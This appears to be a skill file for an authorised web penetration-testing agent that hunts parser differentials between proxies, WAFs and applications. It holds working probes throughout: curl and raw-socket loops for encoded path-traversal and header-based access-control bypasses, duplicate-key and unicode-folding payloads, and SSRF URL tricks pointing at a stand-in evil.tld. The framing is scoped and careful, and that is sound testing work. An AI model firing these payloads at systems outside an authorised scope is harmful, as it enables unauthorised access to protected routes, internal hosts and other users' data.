---
name: zp-semantic-confusion
description: ZeroProtocol hunter for semantic confusion and parser differentials - two components assigning different meaning to one attacker-controlled value. Use when a proxy, WAF, router, framework and sink all read the same URL, path, header, JSON or multipart field, when a validator normalises differently from its sink, when duplicate parameters or unicode folding are in play, or when an internal redirect re-parses a request. The finding is the disagreement plus a security decision taken between the two readings.
---

# zp-semantic-confusion - same bytes, two meanings

**Phase:** 5 | **Gate:** **active.** `zp-scope check <target>` must exit 0 before any request.
Exit 1 refuse and name the pattern · 3 stop · 4 stop.

Every other skill in this pack asks *was the input validated*. This one asks a different
question: **did the component that made the security decision and the component that acted on
the value agree about what the value meant?** A finding here is never "the parser is lenient".
It is a pair of requests differing on exactly one representation axis, where one reading passed
a check and the other reading reached a sink - and you can show both readings.

---

## Procedure

**1. Name the invariant before you touch the target.** Write one sentence: *all components must
agree on the ____ of this value* - origin, path segment, filename, content type, identity,
length, or which occurrence wins. Without a named invariant you cannot tell a differential from
a curiosity, and you will file noise.

**2. Enumerate the consumers.** You need at least two, with a decision between them.

```bash
curl -skI "https://$H/" | grep -iE '^(server|via|x-cache|cf-ray|x-powered-by|x-served-by|x-envoy|x-amz-cf-id|x-request-id)'
curl -skI "https://$H/" --http1.1 | grep -i '^server'
curl -skI "https://$H/" --http2   | grep -i '^server'      # different Server = two stacks
```

Two distinct `Server` values, a `Via`, or an `X-Cache` mean the request is parsed at least twice.
A single-hop app with no proxy rarely hosts this class - spend your time elsewhere.

**3. Take a clean baseline of one protected and one public route.** You need a known 200 and a
known 401/403 to measure against, and you need them for *your own* account.

```bash
P=/admin            # a route that must deny you
Q=/                 # a route that allows you
for u in "$P" "$Q"; do
  printf '%-12s ' "$u"
  curl -sk --path-as-is -o /tmp/zp.b -w '%{http_code} %{size_download} ' "https://$H$u"
  md5sum < /tmp/zp.b
done
```

**4. Change one axis at a time, and diff on four things** - status, length, body digest, and any
header that names a handler. One axis per request is the whole discipline; two axes at once and
the disagreement is no longer attributable to a boundary.

```bash
probe() {  # $1 = path, sent byte-for-byte
  printf '%-34s ' "$1"
  curl -sk --path-as-is -o /tmp/zp.b -w '%{http_code} %{size_download} %{redirect_url} ' "https://$H$1"
  md5sum < /tmp/zp.b
}
for v in "/admin" "/Admin" "/ADMIN" "/%61dmin" "/%2561dmin" "/admin/" "/admin/." "/admin;x=1" \
         "//admin" "/./admin" "/static/../admin" "/static/..%2fadmin" "/static/..%5cadmin" \
         "/%2e%2e/admin" "/admin%09" "/admin%20" "/admin%00" "/admin%0a" "/admin.json" "/admin?"; do
  probe "$v"
done
```

`--path-as-is` is mandatory here - without it curl collapses `..` and `//` itself and you test
nothing. Any row whose status differs from the `/admin` baseline is a lead; a row that reaches
**200 with protected content** is the finding.

**5. Send the exact bytes when a client would normalise them away.** `openssl` first, python
stdlib if `openssl` is absent.

```bash
printf 'GET /%%2e%%2e/admin HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n' "$H" \
  | openssl s_client -quiet -connect "$H:443" -servername "$H" 2>/dev/null | head -20
```

```python
python3 - <<'PY'
import socket, ssl
H, RAW = "TARGET", b"GET /..%2fadmin HTTP/1.1\r\nHost: TARGET\r\nConnection: close\r\n\r\n"
c = ssl.create_default_context(); c.check_hostname = False; c.verify_mode = ssl.CERT_NONE
s = c.wrap_socket(socket.create_connection((H, 443), 10), server_hostname=H)
s.sendall(RAW); print(s.recv(8192).decode("latin-1")[:500]); s.close()
PY
```

Send only well-formed requests. Malformed framing, oversized bodies and delayed-body cases
belong to `zp-smuggling` under its own gate, and crash or exhaustion testing is out of scope for
ZeroProtocol entirely.

**6. Test the validator and the sink separately when you have source.** The signature to grep
for is a check on value A followed by a sink on `transform(A)`.

```bash
grep -rnE 'startsWith|startswith|indexOf|\.includes\(|hasPrefix|LIKE ' --include='*.js' --include='*.py' --include='*.go' --include='*.java' . | head -40
grep -rnE 'unquote|urldecode|decodeURIComponent|normalize\(|NFKC|casefold|toLowerCase|realpath|Path\.resolve' -r . | head -40
```

A prefix allowlist plus a later decode is the highest-yield pair in this whole class. Two
decodes anywhere in the chain (`%2561dmin`) means the check and the sink cannot be reading the
same string.

**7. Prove both readings, then stop.** The proof is: the bytes you sent, the representation the
control saw (its status/log/error), the representation the sink acted on (its response), the
transformation that created the gap, and a paired negative control that fails. Once you have
that, **stop.** Do not enumerate the reachable surface, do not pivot into the handler you
unlocked, do not read another user's data - name the capability and hand off.

---

## Probes and payloads

**Path and URL** - one axis each. Positive = status or body digest differs from baseline.

| Variant | Disagreement it isolates | Positive looks like |
|---|---|---|
| `/%2561dmin` | double decode between proxy and app | 403 at the edge, 200 at the app |
| `/static/..%2fadmin` | dot-segments removed after the cache key or ACL | 200 protected content, or a cache `HIT` |
| `/admin;x=1` | Spring/Tomcat path parameters stripped post-routing | proxy allows, app serves `/admin` |
| `/admin.json`, `/admin.css` | extension-keyed cache or suffix router | static-style caching of a private page |
| `/admin%00`, `/admin%0a` | truncation in one parser only | 200 where `/admin` was 403 |
| `//admin`, `/./admin` | empty-segment normalisation mismatch | ACL miss, app hit |
| `/api/publicish` vs `/api/public/` | prefix allowlist with no segment awareness | sibling route inherits the allow |
| `http://$H@evil.tld/`, `https://evil.tld\@$H/` | userinfo vs host split across two URL parsers | validator sees `$H`, fetcher sees `evil.tld` |
| `http://2130706433/`, `http://0x7f000001/` | integer/hex host forms one parser resolves | SSRF allowlist bypass -> `zp-ssrf` |

**Unicode and case folding** - learn what the target does before choosing a payload.

```bash
python3 - <<'PY'
import unicodedata
for ch in ['K','＇','／','∕','ſ','İ','­','．']:
    print(hex(ord(ch)), repr(ch), 'NFKC=' + repr(unicodedata.normalize('NFKC', ch)),
          'lower=' + repr(ch.lower()), 'upper=' + repr(ch.upper()),
          'utf8=' + ''.join('%%%02X' % b for b in ch.encode()))
PY
```

| Payload | Folds to | Where it pays |
|---|---|---|
| `%E2%84%AA` KELVIN SIGN | `K` under NFKC | echoed back as `K` = the app normalises after filtering |
| `%EF%BC%87` FULLWIDTH APOSTROPHE | `'` | quote reaching a query builder past a char filter |
| `%EF%BC%8F` / `%E2%88%95` | `/` | a segment delimiter created after path validation |
| `%C5%BF` LATIN LONG S | uppercases to `S` | an uppercasing identity check matching `ADMIN` |
| `%C4%B0` DOTTED CAPITAL I | lowercases to `i` plus a mark | username/email identity collision |
| `%C2%AD` SOFT HYPHEN | stripped by some IDNA paths | host allowlist bypass |

**Overloaded and duplicated fields** - the same key read twice, differently.

| Probe | What splits |
|---|---|
| `?id=1&id=2`, then `?id=2&id=1` | first-wins vs last-wins vs array between WAF and app |
| `?id[]=1&id[]=2`, `?id[]=1&id=2` | array coercion; a scalar check on an array value |
| `?a=1%26b=2` vs `?a=1&b=2` | who decodes before splitting |
| `{"role":"user","role":"admin"}` | duplicate JSON keys - most parsers keep the last |
| `{"role":"admin"}` | escaped key seen by the sink parser, missed by a string filter |
| `{"id":"1 "}`, `{"id":1}`, `{"id":[1]}` | type coercion between validator and query layer |
| `Content-Type: application/json; charset=utf-16` with a UTF-16 body | a WAF decoding UTF-8 sees noise, the framework sees the payload |
| same JSON body sent as `text/plain` or `application/x-www-form-urlencoded` | a body parser that a content-type-gated filter skips |
| two `Content-Disposition` parts with `name="role"` | multipart first/last-wins |
| `filename="a.txt"; filename*=UTF-8''a.php` | RFC 5987 form read by the storer, plain form read by the checker -> `zp-upload` |
| `X-Forwarded-For: 1.2.3.4, 127.0.0.1` | first vs last hop trust in a rate-limit or IP allowlist |

**Lifecycle and internal re-parse** - the same request read again in a second state.

```bash
for h in "X-Original-URL: /admin" "X-Rewrite-URL: /admin" "X-Forwarded-Uri: /admin" \
         "X-HTTP-Method-Override: PUT" "X-Original-Method: PUT"; do
  printf '%-34s ' "${h%%:*}"
  curl -sk -o /dev/null -w '%{http_code}\n' "https://$H/" -H "$h"
done
```

A `200` on `/` carrying `X-Original-URL: /admin` means the edge keyed its ACL on the visible
path while the app re-routed on the header. Also compare a route reached directly against the
same route reached through an in-app redirect or subrequest - stale metadata surviving into the
second phase is the same bug with a different clock.

---

## Confirm or kill

THE section. Most of this class dies here, and it should.

| Observation | Verdict |
|---|---|
| variant returns **200 with data the baseline 401/403 withheld** | **confirmed authorization bypass.** Severity from the data. High to Critical |
| validator logs/rejects reading A, sink demonstrably acts on B, one security decision between | **confirmed semantic confusion.** Severity from the sink's authority |
| cache key differs from the path the origin served | confirmed, but the impact is cache-shaped -> prove it on a busted key via `zp-cache-poison` |
| upload detector classified one type, the consumer executed another | confirmed -> `zp-upload` for the execution proof |
| URL validator resolved `$H`, the fetcher resolved your host (OAST hit) | confirmed -> `zp-ssrf` |
| duplicate key where the WAF sees value 1 and the app uses value 2, **and the app rejects the payload anyway** | **WAF bypass only. Not a vulnerability.** Informational at best. Killed |
| status differs (403 vs 404 vs 400) but no protected resource is reached and no sink acts | **killed.** A parser is lenient; nothing disagreed about meaning |
| the app echoes `K` for KELVIN SIGN but every filter runs post-normalisation | normalisation confirmed, exploitation not. Keep the note, file nothing |
| normalisation difference visible only in access logs | log inconsistency, not a finding. Killed - unless the log *is* the control (rate limit, audit ACL) |
| duplicate parameter produces an array and the code reads index 0 everywhere | consistent meaning. Killed |
| variant reaches a route that returns the **same public content** as the baseline | killed. No decision was crossed |
| the differential only reproduces once in five tries | not confirmed. Re-run paired control and exploit five times before writing anything |
| behaviour you read about in a CVE for version X, with the deployed version untested | **killed until reproduced here.** Version-specific claimed as universal is the classic bogus report |
| a `/admin` that is 200 for everyone | not protected. There was never an invariant to break |

Severity is set by the **later** consumer, never by how exotic the payload was. A beautiful
double-decode into an endpoint that returns a public changelog is a Low, and usually a Won't Fix.

---

## High-value patterns

- **CDN or WAF in front of a framework with its own router** - two path parsers, one ACL. The single most productive shape in this class.
- **A prefix allowlist (`startsWith("/public"))` guarding a route table** - test the sibling `/publicish` and the encoded separator.
- **Gateway authorising on the visible path while the app re-routes on `X-Original-URL`** - full admin surface, one header.
- **An SSRF allowlist comparing hostname strings before a fetcher re-parses the URL** - userinfo, backslash and integer-host forms.
- **Upload pipelines where an antivirus or MIME sniffer reads one field and the storer reads another** - `filename*` versus `filename`.
- **Identity systems that case-fold or NFKC-normalise emails after a uniqueness check** - account collision, which is `zp-authz` impact.
- **A JSON body parsed twice - once by a schema validator, once by the ORM** - duplicate keys and type coercion.
- **Anything with two protocol versions on the path (HTTP/2 edge, HTTP/1.1 origin)** - real, and it belongs to `zp-smuggling`.

---

## Pitfalls

- **Moving two axes at once.** The disagreement stops being attributable and the report stops being reproducible.
- **Forgetting `--path-as-is`.** curl normalises `..` and `//` before sending; you measured your own client.
- **Filing a WAF bypass as a vulnerability** when the application rejects the payload identically. This is the most common junk report in the class.
- **Filing a status-code difference** with no protected resource and no sink behind it.
- **Sending malformed framing, oversized bodies or delayed bodies at a live target.** That is a stability risk, not a probe - `zp-smuggling`'s gate exists for a reason, and crash testing is never in scope.
- **Fuzzing breadth instead of depth.** A generator pointed at a live host is a scanner. Build a bounded matrix from axes the stack actually has.
- **Pivoting after the primitive lands** - enumerating files, reading other tenants' records, invoking the handler you unlocked. Stop at the paired proof.
- **Claiming a CVE's behaviour** without reproducing it on the deployed version and configuration.
- **Copying the final payload into the report instead of naming the boundary.** The fix targets the disagreement; a string list gets patched and the bug survives.
- **Testing origin IPs or alternate hosts you found mid-run** without re-running `zp-scope check` on each one.

---

## Hand off to

Cache-key versus origin-path divergence -> `zp-cache-poison`. Protocol or framing differentials,
HTTP/2 downgrade -> `zp-smuggling`. URL-parser splits that reach a fetcher -> `zp-ssrf`.
Path confusion landing in file IO -> `zp-xxe-lfi`. Detector/consumer mismatch on uploads ->
`zp-upload`. Reached routes and identity collisions -> `zp-authz`, `zp-idor`. Type coercion into
a datastore or template -> `zp-sqli`, `zp-rce-ssti`, `zp-proto-pollution`. Duplicate or
overloaded fields in an API or schema -> `zp-api`, `zp-graphql`. Browser-side decode into a DOM
sink -> `zp-xss`; origin-string comparison -> `zp-cors`. Token and claim parsing ->
`zp-jwt-oauth`. Order-dependent lifecycle drift -> `zp-race`, `zp-business-logic`.
Source-level validator/sink pairs -> `zp-code-audit`. Raw-byte capture and replay -> `zp-proxy`,
`zp-toolchain`. Confirmed -> `zp-triage`, then `zp-report` with both readings and the negative control.

Class reference cross-checked against `usestrix/strix` (Apache-2.0) `semantic_confusion`.
